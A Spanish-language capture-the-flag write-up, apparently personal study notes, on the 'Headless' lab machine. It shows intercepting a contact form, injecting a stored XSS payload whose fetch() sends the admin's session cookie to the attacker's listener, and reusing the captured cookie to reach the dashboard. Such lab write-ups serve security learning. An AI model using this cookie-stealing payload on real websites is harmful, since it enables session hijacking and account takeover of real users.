#XSS 

---

Entramos a la pagina web
![[Headless18.png]]
Apretamos el boton de *For questions*

Y nos envia a esta pagina que tiene un formulario de contacto
![[Headless17.png]]
Interceptamos la peticion con caido y vamos a cambiar el contenido del User-Agent y del parametro de *messege* para hacer un [[XSS para robar cookies]] y obtener la cookie de sesion de la persona que creemos que va a leer nuestro formulario

![[Headless10.png]]
Este va a ser el payload que vamos a inyectar `<img src=x onerror=fetch('http://10.10.16.15:80'+document.cookie);>`
Lo estamos colocando en User-Agent y y en parametro de messege que es el vulnerable. El primer [[XSS para robar cookies]] guarda el payload en el parametro message y despues con el payload de user agent ejecuta el *img* y el *fetch()* envia la cookie a mi server
Todo esto mientras estoy en escucha con [[python3 -m http.server]] con el comando `python3 -m http.server 80`

![[Headless9.png]]
Vemos que al enviar la peticion con payload malicioso [[XSS para robar cookies]]  recibimos la cookie del administrador que ve nuestro formulario

is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0

Ahora cambiamos la cookie de sesion en el [[Caido]] y vemos que ya podemos ingresar a la pagina http://10.10.11.8:5000/dashboard

Y listo ya estamos adentro de la maquina
![[Headless20.png]]
